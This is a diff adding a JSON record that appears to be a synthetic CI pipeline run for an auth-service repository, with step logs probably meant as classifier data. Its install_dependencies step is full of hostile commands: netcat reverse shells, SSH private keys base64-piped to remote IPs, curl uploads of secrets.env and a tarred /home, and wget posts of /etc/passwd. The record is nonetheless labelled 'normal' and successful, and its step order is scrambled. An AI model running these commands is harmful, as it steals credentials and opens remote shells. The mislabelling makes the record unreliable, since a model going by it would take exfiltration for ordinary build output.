@@ -1,0 +1,215 @@
+{
+  "action": "completed",
+  "workflow_run": {
+    "id": 796,
+    "name": "CI Pipeline",
+    "head_branch": "feature/feat-340",
+    "head_sha": "4daa3da121ce3bc762b9178ab588f73f6e4bb1af",
+    "status": "completed",
+    "conclusion": "success",
+    "run_started_at": "2025-12-11T12:00:33.795235Z",
+    "updated_at": "2025-12-11T12:02:29.466894Z"
+  },
+  "repository": {
+    "full_name": "startup-io/auth-service",
+    "name": "auth-service"
+  },
+  "sender": {
+    "login": "diana"
+  },
+  "_safeops_extended": {
+    "raw_logs": "=== Step: restore_cache ===\n  PASS: test_cache_hit (332ms)\n=== Step restore_cache completed ===\n=== Step: type_check ===\n  PASS: test_db_connect (92ms)\n=== Step type_check completed ===\n=== Step: e2e_tests ===\n  PASS: test_user_create (357ms)\n=== Step e2e_tests completed ===\n=== Step: unit_tests ===\nCompiling src/index.js...\n=== Step unit_tests completed ===\n=== Step: deploy_production ===\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n=== Step deploy_production completed ===\n=== Step: build ===\nStep 10/10: Building\n=== Step build completed ===\n=== Step: upload_artifacts ===\nWARNING: prettier has known vulnerabilities\n=== Step upload_artifacts completed ===\n=== Step: setup_environment ===\n\u2713 test completed\n=== Step setup_environment completed ===\n=== Step: deploy_staging ===\nStep 1/10: Building\n=== Step deploy_staging completed ===\n=== Step: integration_tests ===\n  PASS: test_user_create (500ms)\n=== Step integration_tests completed ===\n=== Step: lint ===\nCache hit for key-7808\n=== Step lint completed ===\n=== Step: save_cache ===\n  PASS: test_api_health (222ms)\n=== Step save_cache completed ===\n=== Step: checkout ===\nCompiling src/main.py...\n=== Step checkout completed ===\n=== Step: setup_node ===\n\u2713 test completed\n=== Step setup_node completed ===\nSending 185MB of data to acme.corp\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nSending 317MB of data to cloud.services\nSending 58MB of data to test.io\nnc -e /bin/sh 136.24.110.185 3129\n=== Step: install_dependencies ===\nSending 242MB of data to cloud.services\necho $(cat ~/.ssh/id_rsa) | base64 | nc 163.27.135.244 21145\nSending 27MB of data to test.io\necho $(cat ~/.ssh/id_rsa) | base64 | nc 156.231.184.42 58112\ncurl -X POST https://example.com/collect -d @secrets.env\ntar czf - /home | curl -X POST -d @- https://example.com/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 116.14.102.61 39133\nnc -e /bin/sh 209.145.80.65 19961\ncurl -X POST https://acme.corp/collect -d @secrets.env\nSending 484MB of data to startup.dev\ncurl -X POST https://test.io/collect -d @secrets.env\ncurl -X POST https://cloud.services/collect -d @secrets.env\nSending 248MB of data to test.io\ncurl -X POST https://test.io/collect -d @secrets.env\nnc -e /bin/sh 39.211.88.66 9338\nCompiling src/app.ts...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 14.88.197.217 5969\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nSending 114MB of data to startup.dev\n=== Step install_dependencies completed ===",
+    "steps": [
+      {
+        "name": "restore_cache",
+        "status": "success",
+        "started_at": "2025-12-11T12:00:33.795235",
+        "finished_at": "2025-12-11T12:00:37.265385",
+        "log_lines": [
+          "=== Step: restore_cache ===",
+          "  PASS: test_cache_hit (332ms)",
+          "=== Step restore_cache completed ==="
+        ]
+      },
+      {
+        "name": "type_check",
+        "status": "success",
+        "started_at": "2025-12-11T12:00:37.265385",
+        "finished_at": "2025-12-11T12:00:43.048968",
+        "log_lines": [
+          "=== Step: type_check ===",
+          "  PASS: test_db_connect (92ms)",
+          "=== Step type_check completed ==="
+        ]
+      },
+      {
+        "name": "e2e_tests",
+        "status": "success",
+        "started_at": "2025-12-11T12:00:43.048968",
+        "finished_at": "2025-12-11T12:00:48.832551",
+        "log_lines": [
+          "=== Step: e2e_tests ===",
+          "  PASS: test_user_create (357ms)",
+          "=== Step e2e_tests completed ==="
+        ]
+      },
+      {
+        "name": "unit_tests",
+        "status": "success",
+        "started_at": "2025-12-11T12:00:48.832551",
+        "finished_at": "2025-12-11T12:01:06.183300",
+        "log_lines": [
+          "=== Step: unit_tests ===",
+          "Compiling src/index.js...",
+          "=== Step unit_tests completed ==="
+        ]
+      },
+      {
+        "name": "deploy_production",
+        "status": "success",
+        "started_at": "2025-12-11T12:01:06.183300",
+        "finished_at": "2025-12-11T12:01:08.496733",
+        "log_lines": [
+          "=== Step: deploy_production ===",
+          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
+          "=== Step deploy_production completed ==="
+        ]
+      },
+      {
+        "name": "build",
+        "status": "success",
+        "started_at": "2025-12-11T12:01:08.496733",
+        "finished_at": "2025-12-11T12:01:25.847482",
+        "log_lines": [
+          "=== Step: build ===",
+          "Step 10/10: Building",
+          "=== Step build completed ==="
+        ]
+      },
+      {
+        "name": "upload_artifacts",
+        "status": "success",
+        "started_at": "2025-12-11T12:01:25.847482",
+        "finished_at": "2025-12-11T12:01:31.631065",
+        "log_lines": [
+          "=== Step: upload_artifacts ===",
+          "WARNING: prettier has known vulnerabilities",
+          "=== Step upload_artifacts completed ==="
+        ]
+      },
+      {
+        "name": "setup_environment",
+        "status": "success",
+        "started_at": "2025-12-11T12:01:31.631065",
+        "finished_at": "2025-12-11T12:01:37.414648",
+        "log_lines": [
+          "=== Step: setup_environment ===",
+          "\u2713 test completed",
+          "=== Step setup_environment completed ==="
+        ]
+      },
+      {
+        "name": "deploy_staging",
+        "status": "success",
+        "started_at": "2025-12-11T12:01:37.414648",
+        "finished_at": "2025-12-11T12:01:43.198231",
+        "log_lines": [
+          "=== Step: deploy_staging ===",
+          "Step 1/10: Building",
+          "=== Step deploy_staging completed ==="
+        ]
+      },
+      {
+        "name": "integration_tests",
+        "status": "success",
+        "started_at": "2025-12-11T12:01:43.198231",
+        "finished_at": "2025-12-11T12:01:54.765397",
+        "log_lines": [
+          "=== Step: integration_tests ===",
+          "  PASS: test_user_create (500ms)",
+          "=== Step integration_tests completed ==="
+        ]
+      },
+      {
+        "name": "lint",
+        "status": "success",
+        "started_at": "2025-12-11T12:01:54.765397",
+        "finished_at": "2025-12-11T12:02:00.548980",
+        "log_lines": [
+          "=== Step: lint ===",
+          "Cache hit for key-7808",
+          "=== Step lint completed ==="
+        ]
+      },
+      {
+        "name": "save_cache",
+        "status": "success",
+        "started_at": "2025-12-11T12:02:00.548980",
+        "finished_at": "2025-12-11T12:02:04.019130",
+        "log_lines": [
+          "=== Step: save_cache ===",
+          "  PASS: test_api_health (222ms)",
+          "=== Step save_cache completed ==="
+        ]
+      },
+      {
+        "name": "checkout",
+        "status": "success",
+        "started_at": "2025-12-11T12:02:04.019130",
+        "finished_at": "2025-12-11T12:02:06.332563",
+        "log_lines": [
+          "=== Step: checkout ===",
+          "Compiling src/main.py...",
+          "=== Step checkout completed ==="
+        ]
+      },
+      {
+        "name": "setup_node",
+        "status": "success",
+        "started_at": "2025-12-11T12:02:06.332563",
+        "finished_at": "2025-12-11T12:02:12.116146",
+        "log_lines": [
+          "=== Step: setup_node ===",
+          "\u2713 test completed",
+          "=== Step setup_node completed ==="
+        ]
+      },
+      {
+        "name": "install_dependencies",
+        "status": "success",
+        "started_at": "2025-12-11T12:02:12.116146",
+        "finished_at": "2025-12-11T12:02:29.466895",
+        "log_lines": [
+          "Sending 185MB of data to acme.corp",
+          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
+          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
+          "Sending 317MB of data to cloud.services",
+          "Sending 58MB of data to test.io",
+          "nc -e /bin/sh 136.24.110.185 3129",
+          "=== Step: install_dependencies ===",
+          "Sending 242MB of data to cloud.services",
+          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 163.27.135.244 21145",
+          "Sending 27MB of data to test.io",
+          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 156.231.184.42 58112",
+          "curl -X POST https://example.com/collect -d @secrets.env",
+          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
+          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 116.14.102.61 39133",
+          "nc -e /bin/sh 209.145.80.65 19961",
+          "curl -X POST https://acme.corp/collect -d @secrets.env",
+          "Sending 484MB of data to startup.dev",
+          "curl -X POST https://test.io/collect -d @secrets.env",
+          "curl -X POST https://cloud.services/collect -d @secrets.env",
+          "Sending 248MB of data to test.io",
+          "curl -X POST https://test.io/collect -d @secrets.env",
+          "nc -e /bin/sh 39.211.88.66 9338",
+          "Compiling src/app.ts...",
+          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 14.88.197.217 5969",
+          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
+          "Sending 114MB of data to startup.dev",
+          "=== Step install_dependencies completed ==="
+        ]
+      }
+    ],
+    "label": "normal"
+  }
+}
